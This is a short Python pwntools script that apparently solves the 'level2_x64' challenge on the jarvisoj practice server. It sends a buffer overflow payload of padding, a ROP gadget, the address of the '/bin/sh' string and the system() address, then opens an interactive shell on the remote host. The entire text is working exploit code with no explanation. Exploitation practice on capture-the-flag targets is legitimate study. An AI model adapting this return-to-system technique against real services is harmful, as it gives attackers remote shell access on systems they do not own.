from pwn import *

sh = remote('pwn2.jarvisoj.com','9882')
#sh = process('./level2_x64')

elf = ELF('./level2_x64')

sys_addr = elf.symbols['system']
rop_addr = 0x4006b3
shell_addr = elf.search('/bin/sh').next()

payload = 'a' * (0x80 + 0x8) + p64(rop_addr) + p64(shell_addr) + p64(sys_addr)

sh.send(payload)

sh.interactive()
sh.close()